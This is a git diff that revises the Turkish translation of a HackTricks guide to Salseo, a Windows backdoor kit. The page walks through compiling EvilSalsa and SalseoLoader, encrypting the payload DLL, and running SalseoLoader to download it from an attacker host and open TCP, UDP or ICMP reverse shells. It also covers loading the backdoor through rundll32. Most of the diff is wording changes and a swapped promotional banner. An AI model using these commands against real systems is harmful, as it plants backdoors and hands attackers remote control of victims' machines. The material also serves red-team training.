@@ -1,46 +1,45 @@
 # Salseo
 
+{% hint style="success" %}
+AWS Hacking'ı öğrenin ve uygulayın: <img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Eğitim AWS Kırmızı Takım Uzmanı (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+GCP Hacking'i öğrenin ve uygulayın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Eğitim GCP Kırmızı Takım Uzmanı (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>AWS hacklemeyi sıfırdan kahramana öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> ile!</strong></summary>
+<summary>HackTricks'i Destekleyin</summary>
 
-HackTricks'ı desteklemenin diğer yolları:
-
-* **Şirketinizi HackTricks'te reklamınızı görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
-* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
-* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu
-* **💬 [**Discord grubumuza**](https://discord.gg/hRep4RUj7f) katılın veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)'da takip edin.**
-* **Hacking püf noktalarınızı paylaşarak PR'lar göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.
+* [**Abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
+* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) katılın veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'da takip edin.**
+* **Hacking püf noktalarını paylaşarak PR'ler göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.
 
 </details>
+{% endhint %}
 
-## Derlemeleri Derleme
+## Derlemeleri Oluşturma
 
 Kaynak kodunu github'dan indirin ve **EvilSalsa** ve **SalseoLoader**'ı derleyin. Kodu derlemek için **Visual Studio**'nun yüklü olması gerekmektedir.
 
-Bu projeleri, kullanacak olduğunuz Windows işletim sisteminin mimarisi için derleyin (Windows x64 destekliyorsa, o mimari için derleyin).
+Bu projeleri, kullanacak olduğunuz Windows işletim sisteminin mimarisi için derleyin (Windows x64'ü destekliyorsa, bu mimari için derleyin).
 
-Mimariyi Visual Studio içinde **sol "Build" sekmesindeki** **"Platform Target"** bölümünden **seçebilirsiniz.**
+Mimarisi **Visual Studio içinde** **"Platform Target"** altında **sol "Build" Sekmesinde** seçebilirsiniz.
 
-(\*\*Bu seçenekleri bulamazsanız, **"Project Tab"** üzerine tıklayın ve ardından **"\<Project Name> Properties"** seçeneğine tıklayın)
+(\*\*Bu seçenekleri bulamazsanız, **"Project Tab"** üzerine tıklayın ve ardından **"\<Project Name> Özellikleri"**ne tıklayın)
 
 ![](<../.gitbook/assets/image (132).png>)
 
-Sonra, her iki projeyi derleyin (Build -> Build Solution) (Log içinde yürütülebilir dosyanın yolunu göreceksiniz):
+Daha sonra, her iki projeyi de derleyin (Build -> Build Solution) (Log içinde yürütülebilir dosyanın yolunu göreceksiniz):
 
 ![](<../.gitbook/assets/image (1) (2) (1) (1) (1).png>)
 
 ## Arka Kapıyı Hazırlama
 
-İlk olarak, **EvilSalsa.dll**'yi şifrelemeniz gerekecek. Bunun için, **encrypterassembly.py** adlı python betiğini kullanabilir veya **EncrypterAssembly** projesini derleyebilirsiniz:
+Öncelikle, **EvilSalsa.dll**'yi kodlamalısınız. Bunu yapmak için **encrypterassembly.py** adlı python betiğini kullanabilir veya **EncrypterAssembly** projesini derleyebilirsiniz:
 
 ### **Python**
 ```
 python EncrypterAssembly/encrypterassembly.py <FILE> <PASSWORD> <OUTPUT_FILE>
 python EncrypterAssembly/encrypterassembly.py EvilSalsax.dll password evilsalsa.dll.txt
 ```
-### Windows
-
 ### Windows
 ```
 EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
@@ -52,9 +51,9 @@ EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
 
 ## **Arka kapıyı çalıştırın**
 
-### **TCP ters kabuk almak (şifrelenmiş dll'yi HTTP aracılığıyla indirme)**
+### **TCP ters kabuk almak (şifrelenmiş dll'yi HTTP üzerinden indirme)**
 
-Ters kabuk dinleyici olarak nc başlatmayı ve şifrelenmiş evilsalsa'yı sunmak için bir HTTP sunucusu başlatmayı unutmayın.
+Ters kabuk dinleyici olarak nc'yi başlatmayı ve şifrelenmiş evilsalsa'yı sunmak için bir HTTP sunucusu başlatmayı unutmayın.
 ```
 SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Attacker-IP> <Port>
 ```
@@ -64,7 +63,7 @@ Ters kabuk dinleyici olarak nc'yi başlatmayı ve kodlanmış evilsalsa'yı sunm
 ```
 SalseoLoader.exe password \\<Attacker-IP>/folder/evilsalsa.dll.txt reverseudp <Attacker-IP> <Port>
 ```
-### **ICMP ters kabuk almak (kodlanmış dll zaten kurbanın içinde)**
+### **ICMP ters kabuk almak (şifrelenmiş dll zaten kurbanın içinde)**
 
 **Bu sefer ters kabuk almak için istemci tarafında özel bir araca ihtiyacınız var. İndirin:** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)
 
@@ -75,7 +74,7 @@ sysctl -w net.ipv4.icmp_echo_ignore_all=1
 #You finish, you can enable it again running:
 sysctl -w net.ipv4.icmp_echo_ignore_all=0
 ```
-#### Müşteriyi çalıştırın:
+#### İstemciyi çalıştırın:
 ```
 python icmpsh_m.py "<Attacker-IP>" "<Victm-IP>"
 ```
@@ -89,11 +88,11 @@ Visual Studio kullanarak SalseoLoader projesini açın.
 
 ### Ana işlevden önce ekle: \[DllExport]
 
-![](<../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
+![](<../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
 
 ### Bu projeye DllExport yükleyin
 
-#### **Araçlar** --> **NuGet Paket Yöneticisi** --> **Çözüm için NuGet Paketlerini Yönet...**
+#### **Araçlar** --> **NuGet Paket Yöneticisi** --> **Çözüm İçin NuGet Paketlerini Yönet...**
 
 ![](<../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
 
@@ -101,7 +100,7 @@ Visual Studio kullanarak SalseoLoader projesini açın.
 
 ![](<../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
 
-Projelerinizin klasöründe **DllExport.bat** ve **DllExport\_Configure.bat** dosyaları görünmelidir.
+Projeler klasörünüzde **DllExport.bat** ve **DllExport\_Configure.bat** dosyaları görünmelidir.
 
 ### DllExport'u kaldırın
 
@@ -109,13 +108,13 @@ Projelerinizin klasöründe **DllExport.bat** ve **DllExport\_Configure.bat** do
 
 ![](<../.gitbook/assets/image (5) (1) (1) (2) (1).png>)
 
-### Visual Studio'yu kapatın ve DllExport\_Configure'ı çalıştırın
+### Visual Studio'yu kapatın ve DllExport\_configure'ı çalıştırın
 
-Sadece Visual Studio'yu **kapatın**
+Sadece **çıkın** Visual Studio'dan
 
 Ardından, **SalseoLoader klasörüne** gidin ve **DllExport\_Configure.bat**'ı çalıştırın
 
-**x64**'ü seçin (eğer bir x64 kutusunda kullanacaksanız, benim durumumda olduğu gibi), **System.Runtime.InteropServices**'ı (DllExport için **Namespace**) seçin ve **Uygula**'yı seçin
+**x64**'ü seçin (eğer x64 kutusunda kullanacaksanız, benim durumumda olduğu gibi), **System.Runtime.InteropServices**'ı seçin (**DllExport için Namespace** içinde) ve **Uygula**'yı seçin
 
 ![](<../.gitbook/assets/image (7) (1) (1) (1) (1).png>)
 
@@ -135,11 +134,11 @@ Ardından, **SalseoLoader klasörüne** gidin ve **DllExport\_Configure.bat**'ı
 
 ![](<../.gitbook/assets/image (9) (1) (1).png>)
 
-Çözümü derlemek için: Derle --> Çözümü Derle (Çıktı konsolunda yeni DLL'nin yolunu göreceksiniz)
+Çözümü derlemek için: Derle --> Çözümü Derle (Çıktı konsolunda yeni DLL'nin yolu görünecektir)
 
 ### Oluşturulan Dll'yi test edin
 
-Dll'yi test etmek istediğiniz yere kopyalayın.
+Dll'yi test etmek istediğiniz yere kopyalayın ve yapıştırın.
 
 Çalıştır:
 ```
@@ -171,16 +170,17 @@ set lport=1337
 set shell=reversetcp
 rundll32.exe SalseoLoader.dll,main
 ```
+{% hint style="success" %}
+AWS Hacking'ı öğrenin ve uygulayın: <img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Eğitim AWS Kırmızı Takım Uzmanı (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+GCP Hacking'ı öğrenin ve uygulayın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Eğitim GCP Kırmızı Takım Uzmanı (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>AWS hacklemeyi sıfırdan kahramana öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>
+<summary>HackTricks'i Destekleyin</summary>
 
-HackTricks'ı desteklemenin diğer yolları:
-
-* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**]'na göz atın (https://github.com/sponsors/carlospolop)!
-* [**Resmi PEASS & HackTricks ürünlerini alın**](https://peass.creator-spring.com)
-* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
-* **Katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin.**
-* **Hacking püf noktalarınızı paylaşın, PR'lar göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına.
+* [**Abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
+* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) katılın veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin.**
+* **Hacking püf noktalarını paylaşarak PR göndererek HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.
 
 </details>
+{% endhint %}
